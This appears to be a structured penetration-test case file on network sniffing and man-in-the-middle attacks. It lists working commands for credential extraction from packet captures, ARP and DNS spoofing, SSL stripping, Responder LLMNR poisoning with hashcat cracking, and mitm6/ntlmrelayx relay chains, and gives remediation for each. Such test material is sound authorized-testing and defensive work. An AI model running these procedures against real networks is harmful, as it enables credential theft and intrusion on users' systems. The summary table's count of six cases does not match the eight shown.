# Network Sniffing and MITM Test Cases

> This file is a companion to `SKILL.md`, containing structured test cases for network traffic interception, MITM positioning, credential harvesting, and traffic manipulation.

---

## Statistics

| Category | Cases | Severity Distribution |
|----------|-------|----------------------|
| A. Passive Capture | 1 | Medium |
| B. ARP Spoofing MITM | 1 | High |
| C. Credential Harvesting | 1 | Critical |
| D. Bettercap Caplets | 1 | High |
| E. DNS Spoofing | 1 | High |
| F. HTTPS Downgrade | 1 | Critical |
| **Total** | **6** | **M:1, H:3, C:2** |

---

## A. Passive Capture

### TC-NSM-001: Passive Packet Capture and Protocol Analysis

| Attribute | Value |
|-----------|-------|
| **ID** | TC-NSM-001 |
| **Category** | A. Passive Capture |
| **Severity** | Medium |
| **Objective** | Verify the ability to passively capture and analyze network traffic to identify cleartext protocols, credentials, and sensitive data without active interference. |
| **Prerequisites** | Tester has network access on the target segment. tcpdump and tshark are installed. No MITM position is required for this test case. |
| **Test Steps** | 1. Identify the capture interface: `ip addr show` |
| | 2. Start tcpdump capture with BPF filter for common cleartext protocols: `tcpdump -i eth0 -w passive_capture.pcap port 80 or port 21 or port 25 or port 110 or port 143 or port 23` |
| | 3. Allow capture to run for a minimum of 10 minutes to collect representative traffic samples |
| | 4. Analyze the PCAP with tshark protocol hierarchy: `tshark -r passive_capture.pcap -q -z io,phs` |
| | 5. Extract HTTP credentials: `tshark -r passive_capture.pcap -Y "http.authorization" -T fields -e ip.src -e http.authorization` |
| | 6. Extract FTP credentials: `tshark -r passive_capture.pcap -Y "ftp.request.command == USER \|\| ftp.request.command == PASS" -T fields -e ip.src -e ftp.request.command -e ftp.request.arg` |
| | 7. Extract DNS queries: `tshark -r passive_capture.pcap -Y "dns.qr == 0" -T fields -e ip.src -e dns.qry.name` |
| | 8. Export HTTP objects: `tshark -r passive_capture.pcap --export-objects http,/tmp/http_exports` |
| | 9. Document all cleartext protocols discovered and any credentials or sensitive data observed |
| **Expected Results** | Protocol hierarchy reveals all active protocols on the segment. Cleartext credentials are extractable from FTP, HTTP Basic Auth, SMTP AUTH, and Telnet sessions. DNS queries reveal internal hostnames and external services accessed. HTTP objects include images, documents, and potentially sensitive files transferred without encryption. |
| **Remediation** | Enforce TLS for all web traffic (HSTS with preload). Replace FTP with SFTP or FTPS. Disable Telnet and use SSH. Enable STARTTLS for SMTP/IMAP/POP3. Deploy network segmentation to limit sniffing scope. Implement port security on switches. |

---

## B. ARP Spoofing MITM

### TC-NSM-002: ARP Spoofing Man-in-the-Middle Attack

| Attribute | Value |
|-----------|-------|
| **ID** | TC-NSM-002 |
| **Category** | B. ARP Spoofing MITM |
| **Severity** | High |
| **Objective** | Verify the ability to establish a man-in-the-middle position using ARP spoofing, intercept traffic between a target host and the gateway, and confirm the target's connectivity is not disrupted. |
| **Prerequisites** | Tester and target are on the same Layer 2 network segment. IP forwarding is enabled. The gateway IP is known. No Dynamic ARP Inspection (DAI) is in place. |
| **Test Steps** | 1. Enable IP forwarding: `echo 1 > /proc/sys/net/ipv4/ip_forward` |
| | 2. Map the network topology: `arp-scan -l` and record gateway IP and target IP |
| | 3. Start bettercap on the target interface: `bettercap -iface eth0` |
| | 4. Run network discovery: `net.probe on` then `net.show` |
| | 5. Configure ARP spoofing target: `set arp.spoof.targets <target_ip>` |
| | 6. Start ARP spoofing: `arp.spoof on` |
| | 7. Verify MITM position by starting network sniffer: `net.sniff on` |
| | 8. From the target host, browse to a known HTTP site and confirm the request appears in bettercap's sniffer output |
| | 9. Verify the target host retains internet connectivity (ping 8.8.8.8 from target) |
| | 10. Stop spoofing: `arp.spoof off` and confirm ARP tables return to normal |
| **Expected Results** | ARP spoofing successfully poisons the target's ARP cache. The attacker receives all traffic between the target and the gateway. The target maintains full network connectivity (no denial of service). HTTP requests from the target are visible in the sniffer output. ARP tables restore to correct MAC-IP mappings after spoofing stops. |
| **Remediation** | Enable Dynamic ARP Inspection (DAI) on all access switches. Configure static ARP entries for critical infrastructure (gateways, DNS servers). Deploy ARP monitoring tools (arpwatch, XArp). Enable port security to limit MAC addresses per port. Consider 802.1X network access control. |

---

## C. Credential Harvesting

### TC-NSM-003: Responder LLMNR/NBT-NS Credential Harvesting

| Attribute | Value |
|-----------|-------|
| **ID** | TC-NSM-003 |
| **Category** | C. Credential Harvesting |
| **Severity** | Critical |
| **Objective** | Verify the ability to capture NTLM authentication hashes from Windows hosts by poisoning LLMNR, NBT-NS, and mDNS name resolution protocols, and confirm captured hashes are crackable offline. |
| **Prerequisites** | Target network contains Windows hosts. LLMNR and/or NBT-NS protocols are not disabled via Group Policy. Responder is installed and configured. |
| **Test Steps** | 1. First, run Responder in analysis mode to identify opportunities without poisoning: `responder -I eth0 -A` |
| | 2. Review analysis output for active LLMNR/NBT-NS queries from target hosts |
| | 3. Start Responder in active poisoning mode: `responder -I eth0 -w -d -f` |
| | 4. Wait for Windows hosts to broadcast LLMNR/NBT-NS queries (triggered by typos in share paths, misconfigured services, or scheduled tasks referencing non-existent hosts) |
| | 5. Monitor Responder output for captured NTLMv2 challenge-response hashes |
| | 6. Collect hashes from Responder logs: `ls -la /usr/share/responder/logs/` |
| | 7. Extract and format hashes for cracking: `grep -r "NTLMv2" /usr/share/responder/logs/ > ntlmv2_hashes.txt` |
| | 8. Attempt offline cracking with hashcat: `hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt` |
| | 9. Document all captured hashes, their source hosts, and cracking results |
| | 10. Stop Responder: Ctrl+C |
| **Expected Results** | Responder successfully poisons LLMNR/NBT-NS responses and captures NTLMv2 hashes from Windows hosts within the first 15-30 minutes. Hash format is valid NetNTLMv2 (compatible with hashcat mode 5600). At least one hash is crackable with standard wordlists, revealing a plaintext password. The captured hashes include source IP, username, and domain information. |
| **Remediation** | Disable LLMNR via Group Policy: Computer Configuration > Administrative Templates > Network > DNS Client > Turn off Multicast Name Resolution = Enabled. Disable NBT-NS via Group Policy or registry: `HKLM\Software\Policies\Microsoft\Windows\System\DisableNetBIOSoverTcpip = 1`. Enable LDAP signing and SMB signing. Deploy LAPS for unique local administrator passwords. Consider Credential Guard on Windows 10+ for NTLM hash protection. |

---

## D. Bettercap Caplets

### TC-NSM-004: Bettercap Caplet-Based Traffic Manipulation

| Attribute | Value |
|-----------|-------|
| **ID** | TC-NSM-004 |
| **Category** | D. Bettercap Caplets |
| **Severity** | High |
| **Objective** | Verify the ability to use bettercap caplets for automated MITM attack chains, including ARP spoofing, HTTP proxy injection, and credential logging in a single scripted workflow. |
| **Prerequisites** | Bettercap is installed. Tester is on the same Layer 2 segment as the target. The target IP and attacker IP are known. |
| **Test Steps** | 1. Create a caplet file `mitm-test.cap` with the following content: |
| | ``` |
| | # mitm-test.cap |
| | set arp.spoof.targets <target_ip> |
| | set arp.spoof.internal false |
| | arp.spoof on |
| | set net.sniff.output /tmp/caplet_creds.log |
| | net.sniff on |
| | http.proxy on |
| | set http.proxy.injectjs "console.log('[MITM PROOF] Traffic intercepted')" |
| | ``` |
| | 2. Start bettercap with the caplet: `bettercap -iface eth0 -caplet mitm-test.cap` |
| | 3. From the target host, browse to an HTTP website |
| | 4. Verify the injected JavaScript appears in the browser console (F12 > Console) |
| | 5. Check the credential log file: `cat /tmp/caplet_creds.log` |
| | 6. Verify HTTP requests from the target appear in the log |
| | 7. Modify the caplet to add DNS spoofing: append `set dns.spoof.domains test.local` and `set dns.spoof.address <attacker_ip>` and `dns.spoof on` |
| | 8. Restart bettercap with the updated caplet |
| | 9. From the target, attempt to resolve `test.local` and verify it resolves to the attacker IP |
| | 10. Stop bettercap and verify all spoofing modules are disabled |
| **Expected Results** | The caplet executes the full MITM chain automatically: ARP spoofing establishes the MITM position, credential sniffing logs HTTP requests and authorization headers, and JavaScript injection proves the ability to modify responses in transit. The injected JavaScript is visible in the target's browser console. DNS spoofing redirects domain queries to the attacker-controlled IP. All modules can be cleanly stopped with no residual impact. |
| **Remediation** | Deploy network-level ARP monitoring (DAI, arpwatch). Use HSTS and certificate pinning for web applications. Implement DNSSEC for internal DNS zones. Deploy endpoint detection that monitors for unexpected JavaScript injection. Segment the network to limit MITM attack radius. |

---

## E. DNS Spoofing

### TC-NSM-005: DNS Spoofing and Domain Redirection

| Attribute | Value |
|-----------|-------|
| **ID** | TC-NSM-005 |
| **Category** | E. DNS Spoofing |
| **Severity** | High |
| **Objective** | Verify the ability to spoof DNS responses and redirect target hosts to attacker-controlled servers by intercepting and modifying DNS query responses during a MITM position. |
| **Prerequisites** | Tester has MITM position established (via ARP spoofing or IPv6 SLAAC). A rogue web server or service is running on the attacker machine at a known IP. The target domains to spoof are identified. |
| **Test Steps** | 1. Set up a rogue HTTP server on the attacker machine: `python3 -m http.server 80 --directory /tmp/rogue_site` |
| | 2. Create a simple proof page: `echo "<h1>DNS Spoofed</h1>" > /tmp/rogue_site/index.html` |
| | 3. Start bettercap and establish MITM: `bettercap -iface eth0` |
| | 4. Configure DNS spoofing: |
| | `set dns.spoof.domains intranet.target.local,update.target.local` |
| | `set dns.spoof.address <attacker_ip>` |
| | `arp.spoof on` (if not already running) |
| | `dns.spoof on` |
| | 5. From the target host, open a browser and navigate to `http://intranet.target.local` |
| | 6. Verify the target receives the attacker's proof page instead of the legitimate service |
| | 7. Verify the DNS resolution: run `nslookup intranet.target.local` on the target and confirm it resolves to the attacker IP |
| | 8. Check the rogue web server access log for the target's request |
| | 9. Stop DNS spoofing: `dns.spoof off` |
| | 10. Verify DNS resolution returns to normal after stopping |
| **Expected Results** | DNS spoofing successfully redirects the target host's queries for the specified domains to the attacker's IP address. The target's browser loads the attacker's proof page instead of the legitimate intranet site. nslookup confirms the domain resolves to the attacker IP during the attack and reverts to the legitimate IP after the attack stops. The rogue web server logs confirm the target's connection. |
| **Remediation** | Implement DNSSEC for DNS response authentication. Deploy DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT) for encrypted DNS resolution. Use trusted internal DNS servers with no fallback to broadcast protocols. Configure DNS cache locking on Windows DNS servers. Monitor DNS response anomalies with passive DNS logging. |

---

## F. HTTPS Downgrade

### TC-NSM-006: SSL Stripping and HTTPS Downgrade Attack

| Attribute | Value |
|-----------|-------|
| **ID** | TC-NSM-006 |
| **Category** | F. HTTPS Downgrade |
| **Severity** | Critical |
| **Objective** | Verify the ability to downgrade HTTPS connections to HTTP using SSL stripping, capturing credentials and session tokens that would otherwise be protected by TLS encryption. |
| **Prerequisites** | Tester has MITM position established (ARP spoofing active). Target host uses a browser without HSTS preload for the target site. The target site does not use HSTS Strict-Transport-Security headers (or the browser has no prior HSTS cache entry). |
| **Test Steps** | 1. Enable IP forwarding: `echo 1 > /proc/sys/net/ipv4/ip_forward` |
| | 2. Start bettercap and establish ARP spoofing MITM: |
| | `bettercap -iface eth0` |
| | `set arp.spoof.targets <target_ip>` |
| | `arp.spoof on` |
| | 3. Enable HTTP proxy with SSL stripping: |
| | `http.proxy on` |
| | `set http.proxy.sslstrip true` |
| | 4. Start credential sniffing: `net.sniff on` |
| | 5. From the target host, open a browser and navigate to an HTTP site that contains HTTPS login links (e.g., a site with `http://` links that redirect to `https://` login) |
| | 6. Observe in bettercap's output that HTTPS URLs are rewritten to HTTP before reaching the target |
| | 7. Verify credentials submitted on the login form appear in plaintext in the sniffer output |
| | 8. Check the browser address bar on the target — the URL should show `http://` instead of `https://` |
| | 9. Document the captured credentials (username, password, session cookie) |
| | 10. Stop SSL stripping and ARP spoofing: `http.proxy off; arp.spoof off` |
| | 11. Alternative: test with sslstrip standalone tool: |
| | `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080` |
| | `sslstrip -l 8080 -w sslstrip.log` |
| | 12. Review sslstrip.log for captured credentials |
| **Expected Results** | SSL stripping successfully rewrites HTTPS links to HTTP in the intercepted traffic. The target's browser displays `http://` URLs for login pages that normally use HTTPS. Credentials (username and password) are captured in plaintext by the sniffer. The browser does not display certificate warnings because no fake certificate is presented — the connection is simply downgraded. Sites with HSTS preload are resistant to this attack (browser forces HTTPS regardless). |
| **Remediation** | Submit all domains to the HSTS Preload List (https://hstspreload.org/). Configure web servers with Strict-Transport-Security headers: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`. Remove all HTTP-to-HTTPS redirect pages and serve only HTTPS. Enable HTTP Strict Transport Security at the application level. Deploy certificate pinning or Certificate Transparency monitoring. Use browsers with HSTS preload enabled by default (Chrome, Firefox, Edge all support this). |

---

## G. IPv6 Attack Vectors

### TC-NSM-007: IPv6 SLAAC-based MITM with mitm6

| Attribute | Value |
|-----------|-------|
| **ID** | TC-NSM-007 |
| **Category** | G. IPv6 Attack Vectors |
| **Severity** | CRITICAL |
| **Objective** | Verify the ability to establish a man-in-the-middle position in an IPv4/IPv6 dual-stack network by exploiting SLAAC (Stateless Address Autoconfiguration) to advertise as an IPv6 router and relay authentication traffic to internal services |
| **Prerequisites** | Target network is dual-stack (IPv4 and IPv6 enabled); Windows clients present that prefer IPv6 over IPv4; mitm6 tool installed; ntlmrelayx from Impacket available for credential relay |
| **Test Steps** | 1. Start mitm6 on the target interface: `mitm6 -d domain.local -i eth0`<br>2. Verify mitm6 assigns IPv6 addresses to Windows clients (monitor mitm6 output for DHCPv6 responses)<br>3. Confirm Windows clients configure the attacker as their IPv6 DNS server<br>4. Start ntlmrelayx to relay captured authentication: `ntlmrelayx.py -6 -t ldaps://dc01.domain.local --add-computer FAKEPC$ --delegate-access`<br>5. Trigger authentication from Windows clients by accessing WPAD or internal resources<br>6. Monitor ntlmrelayx for relayed authentication attempts<br>7. Verify relayed credentials provide access to the target service (LDAP, SMB)<br>8. Document the complete attack chain from SLAAC to credential relay |
| **Expected Results** | mitm6 successfully advertises as an IPv6 router and responds to DHCPv6 requests from Windows clients; clients configure the attacker as their DNS server; authentication traffic is captured and relayed via ntlmrelayx to internal services; relayed credentials provide access to LDAP or SMB on the domain controller |
| **Remediation** | Disable IPv6 on networks that do not require it; implement IPv6 Router Advertisement Guard (RA Guard) on switches; configure Windows to ignore DHCPv6 advertisements from untrusted sources via Group Policy; enable LDAP signing and channel binding; deploy EDR to detect mitm6-style attacks |

### TC-NSM-008: LLMNR/NBT-NS Poisoning via Responder with NTLM Relay

| Attribute | Value |
|-----------|-------|
| **ID** | TC-NSM-008 |
| **Category** | G. IPv6 Attack Vectors |
| **Severity** | CRITICAL |
| **Objective** | Verify the ability to capture NTLM authentication hashes through LLMNR/NBT-NS name resolution poisoning and relay them to internal services for authenticated access, achieving a complete credential relay attack chain |
| **Prerequisites** | Target network has Windows hosts with LLMNR/NBT-NS enabled (default configuration); Responder and ntlmrelayx from Impacket installed; target services identified for relay (SMB, LDAP, MSSQL) |
| **Test Steps** | 1. Run Responder in analysis mode: `responder -I eth0 -A` to identify active LLMNR/NBT-NS queries<br>2. Start Responder in poisoning mode: `responder -I eth0 -w -d -f`<br>3. In a separate terminal, start ntlmrelayx: `ntlmrelayx.py -t smb://192.168.1.50 -smb2support -c "whoami > C:\proof.txt"`<br>4. Wait for Windows hosts to broadcast LLMNR/NBT-NS queries for non-existent hosts<br>5. Monitor Responder for captured NTLMv2 hashes and ntlmrelayx for relayed sessions<br>6. Verify proof.txt is created on the target server confirming relayed authentication<br>7. Test relay to LDAPS for domain enumeration: `ntlmrelayx.py -t ldaps://dc01.domain.local --no-dump --no-da`<br>8. Document captured hashes, relayed sessions, and access levels achieved |
| **Expected Results** | Responder captures NTLMv2 authentication hashes from Windows hosts via LLMNR/NBT-NS poisoning; ntlmrelayx successfully relays authentication to internal services without knowing the password; relayed session provides authenticated access to SMB shares or LDAP directory; proof of access is documented with file creation or directory enumeration output |
| **Remediation** | Disable LLMNR via Group Policy: Computer Configuration > Administrative Templates > Network > DNS Client > Turn off Multicast Name Resolution = Enabled; disable NBT-NS via registry or Group Policy; enable LDAP signing and SMB signing; deploy LAPS for unique local admin passwords; implement Credential Guard on Windows 10+ for NTLM credential protection |
| **Pass Criteria** | NTLMv2 hashes are captured from at least one Windows host; relayed authentication provides access to at least one internal service; captured hashes are crackable with hashcat mode 5600; complete attack chain from poisoning to authenticated access is documented |
